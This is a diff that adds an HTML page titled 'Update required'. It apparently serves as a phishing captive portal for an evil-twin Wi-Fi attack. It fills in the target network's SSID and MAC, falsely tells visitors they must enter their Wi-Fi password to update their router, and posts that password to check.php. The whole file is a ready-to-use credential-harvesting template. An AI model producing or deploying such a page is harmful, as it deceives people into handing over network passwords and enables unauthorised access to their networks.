@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
+
+		<title>Update required</title>
+
+		<!-- Styles -->
+		<link rel="stylesheet" type="text/css" href="css/jquery.mobile-1.4.5.min.css"/>
+		<link rel="stylesheet" type="text/css" href="css/main.css"/>
+
+		<!-- Scripts -->
+		<script src="js/jquery-1.11.1.min.js"></script>
+		<script src="js/jquery.mobile-1.4.5.min.js"></script>
+		<script src="js/jquery.validate.min.js"></script>
+		<script src="js/additional-methods.min.js"></script>
+	</head>
+	<body>
+		<!-- Main page -->
+		<div data-role="page" data-theme="a">
+			<div class="ui-content" dir="ltr">
+				<fieldset>
+					<form id="loginForm" class="ui-body ui-body-b ui-corner-all" action="check.php" method="POST">
+						</br>
+						<div class="ui-field-contain ui-responsive" style="text-align:center;">
+							<div><u>%%SSID%%</u> (%%MAC%%)</div>
+							<!--<div>Channel: $CHANNEL</div>-->
+						</div>
+						<div style="text-align:center;">
+							<br>
+							<label>In order to update your router, please enter your wifi password.</label>
+							<br>
+						</div>
+						<div class="ui-field-contain">
+							<label for="key1">Password:</label>
+							<input id="key1" style="color:#333; background-color:#CCC" data-clear-btn="true" type="password" value="" name="key1" maxlength="64"/>
+						</div>
+						<input data-icon="check" data-inline="true" name="submitBtn" type="submit" value="Submit"/>
+					</form>
+				</fieldset>
+			</div>
+		</div>
+
+		<script src="js/main.js"></script>
+
+		<script>
+			$.extend( $.validator.messages, {
+				required: "This field is required.",
+				maxlength: $.validator.format( "Password needs to be at least {0} symbols long!" ),
+				minlength: $.validator.format( "Password needs to be at least {0} symbols long!" )
+			});
+		</script>
+	</body>
+</html>
